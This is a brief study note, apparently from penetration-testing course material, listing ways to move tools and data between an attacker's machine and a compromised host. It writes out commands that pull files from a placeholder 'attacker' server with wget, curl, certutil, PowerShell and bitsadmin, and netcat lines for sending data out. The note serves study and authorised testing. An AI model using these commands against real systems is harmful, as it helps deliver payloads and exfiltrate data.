---
status: seedling
tags: [security, file-transfer, linux, windows]
created: 2026-04-19
updated: 2026-04-19
---

# File Transfer Techniques

## Summary
Methods for moving tools and data between an attacker's machine and a compromised target.

## Details
**Core Logical Content Mandate**:
Efficient file transfer is critical for delivering payloads and exfiltrating data.

### Web-Based Transfers (HTTP)
The most common method; uses a web server on the attacker machine.
- **Attacker**: `python3 -m http.server 80`.
- **Target (Linux)**: `wget http://attacker/file` or `curl http://attacker/file -o file`.
- **Target (Windows)**: 
    - `certutil -urlcache -split -f http://attacker/file out`
    - `iwr http://attacker/file -OutFile out` (PowerShell)

### Secure Copy (SCP)
Uses SSH for encrypted transfer.
- `scp file user@host:/path` (Push)
- `scp user@host:/path file` (Pull)

### Netcat Transfers
Useful when standard tools like `wget` are missing.
- **Receiver**: `nc -nlvp 4444 > received_file`.
- **Sender**: `nc <target_ip> 4444 < file_to_send`.

### Windows Specific
- **Bitsadmin**: `bitsadmin /transfer job http://attacker/file C:\out.exe`.
- **Certutil**: (See HTTP section above).

## Associative Trails
File transfers are the "logistics" of a pentest, enabling the deployment of enumeration scripts (e.g., LinPEAS) and post-exploitation tools.

## Connections
- [[Enumeration and Reconnaissance]]
- [[Port Redirection and Tunneling]]

## Sources
- [[PEN-100-notes.md]]
